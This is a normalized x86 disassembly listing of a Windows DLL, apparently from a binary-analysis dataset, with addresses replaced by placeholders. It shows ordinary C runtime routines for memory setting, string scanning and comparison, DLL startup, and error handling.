pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_10027650
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002a0f0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_1002d4db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
sub_1002738b
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1002a4a4
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1002e854
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_10002381
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_1002ae74
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_10027370
push sub_1005381e
call sub_1002c1a3
pop ecx
sub_10027401
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_10027160
mov esi eax
inc esi
push esi
call sub_1002a4a4
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_1002e87c
add esp 0xc
jmp r-xdata
sub_10027471
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_10027160
mov edi eax
inc edi
push edi
call sub_1002a4a4
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_1002e87c
add esp 0xc
jmp r-xdata
sub_100274f1
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10027401
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10027537
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100274ce
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10027558
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100274ce
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1002758f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1002757f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100275b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_1002a840
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_100275d0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_1002d4db
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002e960
add esp 0xc
call sub_1002d4db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
sub_1002762d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10027650
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_1002ed1c
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_100276d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_10027650
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_1002ee6a
pop ecx
sub_10027801
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1002eeed
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_1002ee6a
pop ecx
pop ebp
jmp sub_100276d9
pop ebp
jmp eax
sub_10027837
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
push eax
call sub_1002fbd5
pop ecx
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1002f2f0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1002ef68
push 0x214
push 0x1
call sub_1002ddf5
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
dec [ rw-data ]
cmp [ rw-data ] edi
jne r-xdata
call sub_1002fb89
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1002fa52
mov [ rw-data ] eax
call sub_1002f47d
test eax eax
jge r-xdata
call sub_1002fc05
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
xor eax eax
inc eax
push edi
call sub_1002f282
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1002eeed
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1002ae17
call sub_1002f997
test eax eax
jl r-xdata
call sub_1002ef9c
jmp r-xdata
push esi
call sub_10027a85
pop ecx
jmp r-xdata
push edi
push esi
call sub_1002efd9
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
call sub_1002f6d1
call sub_1002ef9c
call sub_1002fc05
jmp r-xdata
call sub_1002f6d1
jmp r-xdata
call sub_1002f71f
test eax eax
jl r-xdata
push 0x0
call sub_1002ac3a
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1002796c
push 0xc
push r--data
call sub_1002fdfc
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10001000
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_10027837
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_10027837
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10001000
push edi
push 0x0
push ebx
call sub_10027837
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_1002fe41
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1002796c
pop ecx
pop ebp
retn 0xc
call sub_1002ffec
sub_10027a85
push 0xc
push r--data
call sub_1002fdfc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1002fe41
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10030231
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_1002d4db
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1002d499
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10027adb
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_10030261
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_10027b13
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10031b16
add esp 0x14
pop ebp
retn
sub_10027b60
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_10027c10
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_10027c61
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_10029261 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
